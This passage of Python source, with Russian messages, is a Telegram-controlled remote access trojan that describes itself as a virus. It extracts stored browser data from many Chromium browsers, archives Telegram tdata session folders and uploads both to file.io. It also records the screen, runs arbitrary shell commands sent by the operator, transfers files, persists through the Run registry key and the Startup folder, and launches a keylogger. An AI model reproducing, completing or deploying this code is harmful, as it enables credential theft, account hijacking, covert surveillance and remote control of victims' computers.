            'columns': ['Download URL', 'Local Path'],
            'decrypt': False
        }
    }
    available_browsers = installed_browsers()
    for browser in available_browsers:
        browser_path = browsers[browser]
        close_browser(browser)
        start_browser(browser_path)
        master_key = get_master_key_from_path(browser_path)
        browser_info_message = f"Получаю информацию из браузера {browser}..."
        data_messages = []
        for data_type_name, data_type in data_queries.items():
            data_messages.append(f"\n❗️ Получаю {data_type_name.replace('_', ' ').capitalize()}.")
            data = get_data(browser_path, "Default", master_key, data_type)
            if data:
                save_results(message, browser, data_type_name, data)
                data_messages.append(f"✅ Сохранено в {browser}/{data_type_name}.txt.")
            else:
                data_messages.append(f"❌ Данные не найдены")
        bot.send_message(message.chat.id, browser_info_message)
        bot.send_message(message.chat.id, "\n".join(data_messages))
appdata = os.getenv('LOCALAPPDATA')
browsers = {
        'avast': appdata + '\\AVAST Software\\Browser\\User Data',
        'amigo': appdata + '\\Amigo\\User Data',
        'torch': appdata + '\\Torch\\User Data',
        'kometa': appdata + '\\Kometa\\User Data',
        'orbitum': appdata + '\\Orbitum\\User Data',
        'cent-browser': appdata + '\\CentBrowser\\User Data',
        '7star': appdata + '\\7Star\\7Star\\User Data',
        'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
        'vivaldi': appdata + '\\Vivaldi\\User Data',
        'google-chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
        'google-chrome': appdata + '\\Google\\Chrome\\User Data',
        'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
        'microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
        'uran': appdata + '\\uCozMedia\\Uran\\User Data',
        'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
        'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
        'iridium': appdata + '\\Iridium\\User Data',
    }
bot_root_folder = os.path.dirname(os.path.abspath(__file__))
browser_info_folder = os.path.join(bot_root_folder, 'temp_folder')
if not os.path.exists(browser_info_folder):
    os.mkdir(browser_info_folder)
def handle_browsers_info_command(message):
    get_browsers_info(message)
    chat_id = message.chat.id
    bot.send_message(message.chat.id, "Информация о браузерах была успешно извлечена!")
    with tempfile.NamedTemporaryFile(delete=False, suffix='.zip') as temp_zip:
        with zipfile.ZipFile(temp_zip, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(browser_info_folder):
                for file in files:
                    zipf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), browser_info_folder))
    with open(temp_zip.name, 'rb') as zip_file:
        response = requests.post("https://file.io", files={'file': (os.path.basename(temp_zip.name), zip_file)})
    os.remove(temp_zip.name)
    download_url = response.json()['link']
    bot.send_message(chat_id, f"Данные сохранены в корневой папке скрипта в папке temp_folder.\nТакже все данные можно скачать по ссылке:\n{download_url}")
def grab_and_upload_telegram_session(message):
    try:
        bot.send_message(message.chat.id, "Поиск всех папок tdata...\nСканирование может продолжаться от 1 до 5 минут.")
        tdata_folders = []
        for root, dirs, files in os.walk('C:/'):
            for dir_name in dirs:
                folder_path = os.path.join(root, dir_name)
                try:
                    os.listdir(folder_path)
                    if dir_name == 'tdata':
                        tdata_folders.append(folder_path)
                except PermissionError:
                    pass
        if not tdata_folders:
            bot.send_message(message.chat.id, "Папки tdata не найдены.")
            return
        bot.send_message(message.chat.id, "Создаю временную папку...")
        temp_dir = "temp_tdata_archive"
        os.makedirs(temp_dir, exist_ok=True)
        for folder in tdata_folders:
            try:
                folder_name = os.path.basename(os.path.dirname(folder))
                folder_name = ''.join(random.choice(string.ascii_letters) for _ in range(10))
                archive_name = f"{folder_name}_tdata.zip"
                archive_path = os.path.join(temp_dir, archive_name)
                shutil.make_archive(os.path.join(temp_dir, folder_name), 'zip', folder)
            except Exception as e:
                pass

        bot.send_message(message.chat.id, "Загружаю архивы на файлообменник...")
        file_links = []
        for root, _, files in os.walk(temp_dir):
            for file in files:
                file_path = os.path.join(root, file)
                fileio_url = upload_to_fileio(file_path)
                if fileio_url:
                    file_size = os.path.getsize(file_path)
                    link_message = f"Ссылка на архив (Размер: {file_size} байт): {fileio_url}"
                    file_links.append(link_message)
        bot.send_message(message.chat.id, "Удаляю временную папку и отправляю ссылки...")
        shutil.rmtree(temp_dir, ignore_errors=True)
        if file_links:
            message_to_send = "\n".join(file_links)
            bot.send_message(message.chat.id, message_to_send)
            backcom
        else:
            bot.send_message(message.chat.id, "Не удалось загрузить архивы на файлообменник.")
            backcom
    except Exception as e:
        bot.send_message(message.chat.id, f"Произошла ошибка: {str(e)}")
        bot.register_next_step_handler(message, get_text_messages)
        backcom
def get_directory_listing(message):
    try:
        bot.send_message(message.chat.id, "Пожалуйста, введите путь к директории на вашем компьютере:")
        bot.register_next_step_handler(message, process_directory_input)
    except Exception as e:
        bot.send_message(message.chat.id, f"Произошла ошибка: {str(e)}")
def process_directory_input(message):
    try:
        directory_path = message.text
        if os.path.exists(directory_path) and os.path.isdir(directory_path):
            os.chdir(directory_path)
            result = subprocess.check_output("dir /b", shell=True, text=True, encoding='cp866')
            script_dir = os.path.dirname(os.path.abspath(__file__))
            file_path = os.path.join(script_dir, "directory_listing.txt")
            with open(file_path, "w", encoding="utf-8") as file:
                file.write(result)
            with open(file_path, "rb") as file:
                bot.send_document(message.chat.id, file)
                bot.send_message(message.chat.id, "Ответ от консоли был выслан в текстовом файле.")
                backcom
            os.remove(file_path)
        else:
            bot.send_message(message.chat.id, "Указанная директория не существует или не является директорией.")
            back (message)
    except Exception as e:
        bot.send_message(message.chat.id, f"Произошла ошибка: {str(e)}")
        back (message)
recording = False
out = None
chat_id = None
def start_recording_screen():
    global recording, out

    if not recording:
        screen_width, screen_height = pyautogui.size()
        resolution = (screen_width, screen_height)
        fps = 60
        output_filename = 'screen_record.mp4'
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        out = cv2.VideoWriter(output_filename, fourcc, fps, resolution)
        recording = True
        recording_thread = threading.Thread(target=record_screen, args=(resolution, fps))
        recording_thread.start()
        threading.Timer(125, stop_recording_screen).start()
def record_screen(resolution, fps):
    global recording, out

    while recording:
        try:
            screenshot = pyautogui.screenshot()
            frame = np.array(screenshot)
            frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
            out.write(frame)
        except Exception as e:
            print(f"Ошибка при записи видео: {str(e)}")
def stop_recording_screen():
    global recording, out
    if recording:
        recording = False
        out.release()
        cv2.destroyAllWindows()

        try:
            with open('screen_record.mp4', 'rb') as video_file:
                bot.send_video(chat_id, video_file)
        except telebot.apihelper.ApiException as e:
            if e.result.status_code == 413:
                bot.send_message(chat_id, "Видео слишком большое. Загружаю на файлообменник...")
            else:
                bot.send_message(chat_id, f'Ошибка при отправке видео: {str(e)}')
        upload_url = 'https://file.io'
        with open('screen_record.mp4', 'rb') as video_file:
            response = requests.post(upload_url, files={'file': video_file})
        if response.status_code == 200:
            file_info = response.json()
            file_url = file_info.get('link')
            if file_url:
                bot.send_message(chat_id, f'Ссылка на видео: {file_url}')
            else:
                bot.send_message(chat_id, 'Ошибка получения ссылки на файл с файлообменника. Возможно, ваш файл слишком большой, либо попробуйте позже.')
        else:
            bot.send_message(chat_id, 'Ошибка загрузки файла на файлообменник. Возможно, ваш файл слишком большой, либо попробуйте позже.')
        video_path = os.path.abspath('screen_record.mp4')
        bot.send_message(chat_id, f'Видео сохранено по пути: {video_path}')
def record_screen(resolution, fps):
    global recording, out

    while recording:
        try:
            screenshot = pyautogui.screenshot()
            frame = np.array(screenshot)
            frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
            out.write(frame)
        except Exception as e:
            print(f"Ошибка при записи видео: {str(e)}")
def start_recording_command(message):
    global recording, chat_id
    if not recording:
        chat_id = message.chat.id
        start_recording_screen()
        recording = True
    else:
        bot.send_message(message.chat.id, "Запись экрана уже активирована.")
def stop_recording_command(message):
    global recording, chat_id
    if recording:
        stop_recording_screen()
        recording = False
    else:
        bot.send_message(message.chat.id, "Запись экрана не активирована.")
@bot.message_handler(func=lambda message: re.match(r'^[a-zA-Z]+\s+https?://\S+', message.text))
def process_link_browser(message):
    user_id = message.chat.id
    try:
        parts = message.text.split()
        browser = parts[0]
        link = parts[1]
        supported_browsers = ["opera", "yandex", "chrome", "firefox", "edge", "brave"]
        if browser.lower() not in supported_browsers:
            bot.send_message(user_id, "Неверно выбран браузер. Пожалуйста, выберите один из предложенных браузеров.")
        else:
            result = open_link_in_browser(link, browser)
            if result:
                bot.send_message(user_id, result)
            else:
                bot.send_message(user_id, f"Открыта ссылка в браузере {browser.capitalize()}: {link}")
                backcom
    except Exception as e:
        bot.send_message(user_id, f"Произошла ошибка: {str(e)}")
def open_link_in_browser(link, browser):
    try:
        browser_path = None
        if browser == "opera":
            browser_path = "C:\Program Files\Opera\launcher.exe"
        elif browser == "yandex":
            user_name = os.getlogin()
            browser_path = r"C:\Users\{user_name}\AppData\Local\Yandex\YandexBrowser\Application\browser.exe"
        elif browser == "chrome":
            browser_path = "C:\Program Files\Google\Chrome\Application\chrome.exe"
        elif browser == "firefox":
            browser_path = "C:\Program Files\Mozilla Firefox\firefox.exe"
        elif browser == "edge":
            browser_path = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
        elif browser == "brave":
            browser_path = "C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"
        if browser_path:
            webbrowser.register(browser, None, webbrowser.BackgroundBrowser(browser_path))
            webbrowser.get(browser).open(link)
        else:
            return f"Браузер {browser.capitalize()} не найден."
    except Exception as e:
        return f"Произошла ошибка: {str(e)}"
        backcom
def find_and_save_files(output_filename, folders_to_search, file_extensions):
    files_list = []
    for folder in folders_to_search:
        for root, _, files in os.walk(folder):
            for file in files:
                if file.lower().endswith(file_extensions):
                    files_list.append(os.path.join(root, file))
    with open(output_filename, "w", encoding="utf-8") as file:
        for file_item in files_list:
            file.write(file_item + "\n")
    return files_list
def find_and_save_archives(output_filename, folders_to_search):
    archives_list = []
    for folder in folders_to_search:
        for root, _, files in os.walk(folder):
            for file in files:
                if file.lower().endswith((".rar", ".zip", ".iso", ".7z", "arj", "lim", "ain", "ace", "zoo", "lzh", "gz", "gzip", "tar")):
                    archives_list.append(os.path.join(root, file))
    with open(output_filename, "w", encoding="utf-8") as file:
        for archive_item in archives_list:
            file.write(archive_item + "\n")
    return archives_list
text_document_extensions = (".txt", ".docx", ".rtf", ".doc", ".html", ".pdf", ".odt")
archive_extensions = (".rar", ".zip", ".iso", ".7z")
folders_to_search = [
    os.path.expanduser("~/Downloads"),
    os.path.expanduser("~/Documents"),
    os.path.expanduser("~/Desktop"),
]
text_documents = find_and_save_files("text_documents_list.txt", folders_to_search, text_document_extensions)
archives = find_and_save_archives("archives_list.txt", folders_to_search)
if text_documents:
    with open("text_documents_list.txt", "rb") as file:
        pass
    os.remove("text_documents_list.txt")
if archives:
    with open("archives_list.txt", "rb") as file:
        pass
    os.remove("archives_list.txt")
def get_external_ip_address():
    try:
        req = requests.get('https://api64.ipify.org?format=json')
        data = req.json()
        ip = data['ip']
        return ip
    except Exception as e:
        return "IP-адрес не найден"
def get_ip_address():
    try:
        host_name = socket.gethostname()
        ip_address = socket.gethostbyname(host_name)
        return ip_address
    except Exception as e:
        return "IP-адрес не найден"  
def get_cpu_info():
    uname = platform.uname()
    return f"Процессор: {uname.processor}"
def get_hardware_info():
    pythoncom.CoInitialize()
    try:
        hardware_info = "Информация о железе:\n"
        motherboard_info = wmi.WMI().Win32_BaseBoard()# Получение информации о материнской плате
        if motherboard_info:
            hardware_info += f"Материнская плата: {motherboard_info[0].Product}\n"
        processor_info = wmi.WMI().Win32_Processor()# Получение информации о процессоре
        if processor_info:
            hardware_info += f"Процессор: {processor_info[0].Name}\n"
        bios_info = wmi.WMI().Win32_BIOS()# Получение информации о BIOS
        if bios_info:
            hardware_info += f"BIOS: {bios_info[0].Manufacturer} {bios_info[0].Version}\n"
        disk_info = wmi.WMI().Win32_DiskDrive()# Получение информации о дисках        
        if disk_info:
            disk_size_gb = float(disk_info[0].Size) / (1024 ** 3)
            hardware_info += f"Жесткий диск: {disk_info[0].Model} ({disk_size_gb:.2f} ГБ)\n"   
        battery_info = wmi.WMI().Win32_Battery()#Информация о батарее (если это ноутбук)
        if battery_info:
            hardware_info += f"Батарея: {battery_info[0].DeviceID}\n"
        return hardware_info
    except Exception as e:
        return f"Ошибка при получении информации о железе: {str(e)}"
    pythoncom.CoUninitialize()
def get_gpu_info():
    try:
        gpu_list = GPUtil.getGPUs()
        if gpu_list:
            gpu_info = "\n".join([f"Видеокарта {i + 1}:\nМодель: {gpu.name}\nVRAM: {gpu.memoryTotal} МБ\n"
                                  f"Загрузка: {gpu.load * 100:.2f}%\nТемпература: {gpu.temperature}°C"
                                  for i, gpu in enumerate(gpu_list)])
        else:
            gpu_info = "Информация о видеокарте не найдена."
    except Exception as e:
        gpu_info = f"Ошибка при получении информации о видеокарте: {str(e)}"
    return gpu_info
def get_monitor_info():
    monitors = get_monitors()
    monitor_info = []
    for monitor in monitors:
        monitor_info.append(f"Монитор: {monitor.name} ({monitor.width}x{monitor.height})")
    return "\n".join(monitor_info)
def get_window_titles():
    window_titles = pygetwindow.getAllTitles()
    return window_titles
def get_user_info():
        user_info = ""
        try:
            user_info = "Информация о пользователе:\n"
            user_info += f"Имя пользователя: {os.getlogin()}\n"
            user_info += f"Домен: {os.getenv('USERDOMAIN')}\n"
            user_info += f"Имя компьютера: {os.getenv('COMPUTERNAME')}\n"
        except Exception as e:
            user_info = f"Ошибка при получении информации о пользователе: {e}"
        return user_info
def get_security_info():
    current_directory = os.getcwd()
    access_rights = os.access(current_directory, os.R_OK)
    antivirus_status = "Enabled"
    try:
        antivirus_status_output = subprocess.check_output(["powershell", "Get-MpComputerStatus"]).decode("utf-8")
        if "AMServiceEnabled" in antivirus_status_output:
            antivirus_status = "Disabled"
    except subprocess.CalledProcessError:
        pass
    firewall_status = "Enabled"
    try:
        firewall_status_output = subprocess.check_output(["netsh", "advfirewall", "show", "allprofiles", "state"], encoding="cp866")
        if "OFF" in firewall_status_output:
            firewall_status = "Disabled"
    except subprocess.CalledProcessError:
        pass
    security_info = f'''
Права доступа в текущей директории: {"Доступны" if access_rights else "Ограничены"}
Статус антивирусного ПО: {antivirus_status}
Статус брандмауэра: {firewall_status}
'''
    return security_info
def get_computer_info():
    script_directory = os.path.dirname(os.path.abspath(__file__))
    uname = os.getlogin()
    windows = platform.platform()
    processor = get_cpu_info()
    memory_info = psutil.virtual_memory()
    disk_info = psutil.disk_usage('/')
    gpu_info = get_gpu_info()
    monitors_info = get_monitor_info()
    external_ip = get_external_ip_address()
    local_ip = get_ip_address()
    window_titles = get_window_titles()
    user_info = get_user_info()
    security_info = get_security_info()
    hardware_info = get_hardware_info()
    window_list = "\n".join([f"{i + 1}. {title}" for i, title in enumerate(window_titles, start=1) if title.strip()])
    
    info = f'''
Версия скрипта: 1.7
Расположение вируса: {script_directory}

{user_info}
Внешний IP: {external_ip}
Локальный IP: {local_ip}

ОС: {windows}
{processor}
{security_info}

{hardware_info}

Оперативная память: {memory_info.total / (1024 ** 3):.2f} ГБ
Доступно места на диске: {disk_info.free / (1024 ** 3):.2f} ГБ
{gpu_info}
{monitors_info}

Список окон:
{window_list}


'''
    return info
def send_computer_info(message):
    info = get_computer_info()
    file_path = "computer_info.txt"
    with open(file_path, 'w', encoding='utf-8') as file:
        file.write(info)
    with open(file_path, 'rb') as file:
        bot.send_document(message.chat.id, file)
        backcom
    os.remove(file_path)
def get_unique_running_processes():
    running_processes = set()
    for process in psutil.process_iter(attrs=['name']):
        process_name = process.info['name']
        running_processes.add(process_name)
    unique_processes = sorted(list(running_processes))
    return unique_processes
def send_process_list(message):
    if message.from_user.id == my_id:
        bot.send_chat_action(my_id, 'typing')
        unique_processes = get_unique_running_processes()
        if unique_processes:
            bot.send_message(my_id, "Список запущенных процессов:\n\n" + "\n".join(unique_processes))
            bot.register_next_step_handler(message, files_process)
        else:
            bot.send_message(my_id, "Список запущенных процессов пуст.")
            bot.register_next_step_handler(message, files_process)
    else:
        info_user(message)
        bot.register_next_step_handler(message, files_process)
def get_process_list():
    process_list = []
    for proc in psutil.process_iter(['pid', 'name']):
        process_name = proc.info['name']
        process_list.append(process_name)
    return process_list
def send_installed_programs_as_document(message):
    try:
        bot.send_message(my_id, "Сканировние установленных программ. Пожалуйста подождите, текстовый файл может отправляться до 5 минут.")
        programs = get_installed_programs()
        if programs:
            file_path = "installed_programs.txt"
            if save_programs_to_file(programs, file_path):
                with open(file_path, "rb") as file:
                    bot.send_document(message.chat.id, file)
                os.remove(file_path)
                bot.register_next_step_handler(message, reply_markup=grabber_submenu_keyboard)
            else:
                bot.send_message(message.chat.id, "Не удалось сохранить список программ в файл.")
                bot.register_next_step_handler(message, reply_markup=grabber_submenu_keyboard)
        else:
            bot.send_message(message.chat.id, "Не удалось получить список установленных программ.")
    except Exception as e:
        print(f"Произошла ошибка: {e}")
def get_installed_programs():
    try:
        programs = []
        result = subprocess.check_output("wmic product get name", shell=True, text=True, encoding='cp866')
        programs.extend([line.strip() for line in result.split("\n") if line.strip()])
        program_folders = [
            os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs"),
            os.path.join(os.environ["LOCALAPPDATA"], "Programs"),
            os.path.join(os.environ["ProgramData"], "Microsoft", "Windows", "Start Menu", "Programs"),
            os.path.join(os.environ["ProgramFiles"]),
            os.path.join(os.environ["ProgramFiles(x86)"]),
            os.path.join(os.path.expanduser("~"), "Desktop"),
            os.path.join(os.path.expanduser("~"), "Downloads"),
            os.path.join(os.path.expanduser("~"), "Documents"),
        ]
        for folder in program_folders:
            if os.path.exists(folder):
                for root, _, files in os.walk(folder):
                    for file in files:
                        if file.endswith((".lnk", ".exe")):
                            programs.append(f"Путь: {os.path.join(root, file)}")
        return programs
    except Exception as e:
        print(f"Произошла ошибка при получении списка программ: {e}")
        return None
def save_programs_to_file(programs, file_path):
    try:
        with open(file_path, "w", encoding="utf-8") as file:
            file.write("\n".join(programs))
        return True
    except Exception as e:
        print(f"Произошла ошибка при сохранении программ в файл: {e}")
        return False
def kill_process(message):
    try:
        bot.send_chat_action(my_id, "typing")
        process_name = message.text
        os.system("taskkill /IM " + process_name + " -F")
        bot.send_message(my_id, f"Процесс \"{process_name}\" успешно завершен", reply_markup=files_keyboard)
        bot.register_next_step_handler(message, files_process)
    except Exception as e:
        bot.send_message(my_id, f"Ошибка при завершении процесса: {str(e)}")
        bot.register_next_step_handler(message, files_process)
def handle_error(error, message):
    try:
        error_message = f"Произошла ошибка: {str(error)}"
        bot.send_message(my_id, error_message)
    except Exception as e:
        print(f"Ошибка при обработке ошибки: {str(e)}")
def back(message):
    try:
        bot.register_next_step_handler(message, get_text_messages)
        bot.send_message(my_id, "Вы попали в главное меню", reply_markup=menu_keyboard)
    except Exception as e:
        handle_error(e, message)
def backcom():
    try:
        bot.register_next_step_handler(get_text_messages, reply_markup=menu_keyboard)
    except Exception as e:
        handle_error(e, )
def info_user(message):
	bot.send_chat_action(my_id, 'typing')
	alert = f"Кто-то пытался отправить команду: \"{message.text}\"\n\n"
	alert += f"user id: {str(message.from_user.id)}\n"
	alert += f"first name: {str(message.from_user.first_name)}\n"
	alert += f"last name: {str(message.from_user.last_name)}\n" 
	alert += f"username: @{str(message.from_user.username)}"
	bot.send_message(my_id, alert, reply_markup = menu_keyboard)
def start_process(message):
    try:
        bot.send_chat_action(my_id, 'typing')
        file_path = message.text
        if os.path.exists(file_path):
            os.startfile(r'' + file_path)
            bot.send_message(my_id, f"Файл по пути \"{file_path}\" запустился", reply_markup=files_keyboard)
            bot.register_next_step_handler(message, files_process)
        else:
            bot.send_message(my_id, "Ошибка! Указан неверный файл", reply_markup=files_keyboard)
            bot.register_next_step_handler(message, files_process)
    except Exception as e:
        handle_error(e, message)
        bot.send_message(my_id, "Ошибка! Указан неверный файл", reply_markup=files_keyboard)
        bot.register_next_step_handler(message, files_process)
def cmd_process(message):
    bot.send_chat_action(my_id, 'typing')
    try:
        command = message.text
        result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=False)
        encoding_info = chardet.detect(result.stdout)
        detected_encoding = encoding_info['encoding']
        if detected_encoding is None:
            detected_encoding = 'utf-8'
        output_text = result.stdout.decode(detected_encoding, errors='replace')
        with open("cmd_output.txt", "w", encoding="utf-8") as output_file:
            output_file.write(output_text)
        if not output_text.strip():
            bot.send_message(my_id, "Результат выполнения команды пуст.")
            backcom
        else:
            with open("cmd_output.txt", "rb") as file:
                bot.send_document(my_id, file)
                bot.send_message(my_id, "Команда выполнена, результат вы можете посмотреть в текстовом файле")
                backcom
        bot.register_next_step_handler(message, addons_process)
    except Exception as e:
        bot.send_message(my_id, f"Ошибка при выполнении команды: {str(e)}")
        bot.register_next_step_handler(message, addons_process)
        backcom
def downfile_process(message):
    bot.send_chat_action(my_id, 'typing')
    try:
        file_path = message.text
        if os.path.exists(file_path):
            if os.path.isfile(file_path):
                bot.send_message(my_id, "Файл загружается, подождите...")
                bot.send_chat_action(my_id, 'upload_document')
                file_doc = open(file_path, 'rb')
                bot.send_document(my_id, file_doc)
                bot.register_next_step_handler(message, files_process)
            elif os.path.isdir(file_path):
                bot.send_message(my_id, "Папка архивируется и загружается на файлообменник, подождите... Это может занять от 1 до 10 минут, в зависимости от веса файла.")
                zip_filename = "archive.zip"
                with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as archive:
                    for foldername, subfolders, filenames in os.walk(file_path):
                        for filename in filenames:
                            filepath = os.path.join(foldername, filename)
                            archive.write(filepath, os.path.relpath(filepath, file_path))
                fileio_url = upload_to_fileio(zip_filename)
                if fileio_url:
                    os.remove(zip_filename)
                bot.send_message(my_id, f"Архив создан и загружен: {fileio_url}")
                bot.register_next_step_handler(message, files_process)
            else:
                bot.send_message(my_id, "Указанный путь не является ни файлом, ни директорией.")
                bot.register_next_step_handler(message, files_process)
        else:
            bot.send_message(my_id, "Файл или директория не найдены или указан неверный путь.")
            bot.register_next_step_handler(message, files_process)
    except Exception as e:
        os.remove(zip_filename)
        bot.send_message(my_id, f"Ошибка: {str(e)}")
        bot.register_next_step_handler(message, files_process)
def upload_to_fileio(filename):
    try:
        with open(filename, 'rb') as file:
            response = requests.post('https://file.io', files={'file': file})
            data = response.json()
            if data['success']:
                return data['link']
            else:
                return None
    except Exception as e:
        return None
def uploadfile_process(message):
    bot.send_chat_action(my_id, 'typing')
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        src = message.document.file_name
        with open(src, 'wb') as new_file:
            new_file.write(downloaded_file)
        current_directory = os.getcwd()
        file_location = os.path.join(current_directory, src)
        bot.send_message(my_id, f"Файл успешно загружен. \nОн находится по пути: \n{file_location}")
        bot.register_next_step_handler(message, files_process)
    except:
        bot.send_message(my_id, "Ошибка! Отправьте файл как документ")
        bot.register_next_step_handler(message, files_process)
def process_download(message):
    try:
        url = message.text
        User.urldown = url
        bot.send_message(message.chat.id, "Укажите путь сохранения файла:")
        bot.register_next_step_handler(message, process_save)
    except Exception as e:
        bot.send_message(message.chat.id, f"Ошибка: {str(e)}")
MAX_FILE_SIZE = 1024 * 1024 * 1024  # Максимальный размер файла - 1 ГБ
def process_save(message):
    try:
        save_path = message.text
        parsed_url = urlparse(User.urldown)
        filename = os.path.basename(parsed_url.path)
        file_path = os.path.join(save_path, filename)
        if not os.path.exists(save_path):
            os.makedirs(save_path)
        response = requests.get(User.urldown, stream=True)
        if response.status_code == 200:
            content_length = int(response.headers.get('content-length', 0))
            if content_length <= MAX_FILE_SIZE:
                with open(file_path, 'wb') as file:
                    for chunk in response.iter_content(chunk_size=1024):
                        file.write(chunk)
                bot.send_message(message.chat.id, f"Файл успешно сохранен по пути \"{file_path}\"")
                bot.register_next_step_handler(message, files_process)
            else:
                bot.send_message(message.chat.id, f"Файл слишком большой. Максимально допустимый размер: {MAX_FILE_SIZE} байт.")
                bot.register_next_step_handler(message, files_process)
        else:
            bot.send_message(message.chat.id, "Ошибка при загрузке файла. Пожалуйста, проверьте ссылку и попробуйте еще раз.")
            bot.register_next_step_handler(message, files_process)
    except Exception as e:
        bot.send_message(message.chat.id, f"Ошибка при загрузке файла: {str(e)}")
        bot.register_next_step_handler(message, files_process)
def messaga_process(message):
	bot.send_chat_action(my_id, 'typing')
	try:
		MessageBox(None, message.text, 'Automatic', 0)
		bot.send_message(my_id, f"Уведомление с текстом \"{message.text}\" было закрыто")
	except:
		bot.send_message(my_id, "Ошибка")
def screen_process(message):
	try:
		get_screenshot()
		bot.send_photo(my_id, open("screen", "rb"))
		bot.register_next_step_handler(message, mouse_process)
		os.remove("screen.png")
		os.remove("screen.png")
	except:
			bot.send_chat_action(my_id, 'typing')
			bot.send_message(my_id, "Компьютер заблокирован")
			bot.register_next_step_handler(message, mouse_process)
def get_screenshot():
    try:
        screenshot = pyautogui.screenshot()
        screenshot.save("screen.png")
        return "screen.png"
    except Exception as e:
        return str(e)
        
def add_to_startup(script_path, add_for_all_users=False):
    # Определите ключ реестра, в зависимости от того, добавляете ли вы скрипт для всех пользователей или текущего пользователя.
    if add_for_all_users:
        registry_key = winreg.HKEY_LOCAL_MACHINE
        key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    else:
        registry_key = winreg.HKEY_CURRENT_USER
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"

    script_name = os.path.basename(script_path)
    key = winreg.OpenKey(registry_key, key_path, 0, winreg.KEY_WRITE)
    
    try:
        winreg.SetValueEx(key, script_name, 0, winreg.REG_SZ, script_path)
    except Exception as e:
        print(f"Ошибка при добавлении в автозагрузку: {str(e)}")
    finally:
        winreg.CloseKey(key)

    # Для автозагрузки скопируйте скрипт в папку, чтобы он не был удален или перемещен
    startup_folder_path = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    script_destination = os.path.join(startup_folder_path, script_name)
    
    try:
        if not os.path.exists(startup_folder_path):
            os.makedirs(startup_folder_path)
        shutil.copy(script_path, script_destination)
    except Exception as e:
        print(f"Ошибка при копировании в папку автозагрузки: {str(e)}")
    
    # Создайте ярлык на скрипт в папке автозагрузки
    if not os.path.isfile(script_destination):
        print(f"Не удалось скопировать скрипт в папку автозагрузки.")
    
    # Добавьте ярлык в автозагрузку для всех пользователей
    if add_for_all_users:
        all_users_startup = os.path.join(os.environ['ProgramData'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'StartUp')
        script_destination_all_users = os.path.join(all_users_startup, script_name)
        try:
            if not os.path.exists(all_users_startup):
                os.makedirs(all_users_startup)
            shutil.copy(script_path, script_destination_all_users)
        except Exception as e:
            print(f"Ошибка при копировании скрипта для всех пользователей: {str(e)}")
    
    return script_destination

# Пример использования
if ctypes.windll.shell32.IsUserAnAdmin():
    script_path = sys.argv[0]  # Путь к текущему скрипту
    add_to_startup(script_path, add_for_all_users=False)  # Добавьте скрипт в автозагрузку для текущего пользователя
        
if __name__ == "__main__":
    send_computer_info_bot()
    logger = KeyLogger() 
    logger_thread = threading.Thread(target=logger.run) #Создаём и запускаем поток для кейлоггера
    logger_thread.daemon = True
    logger_thread.start()
    bot.polling(none_stop=True, interval=0, timeout=20)
    app = QApplication([])
    app.exec_()
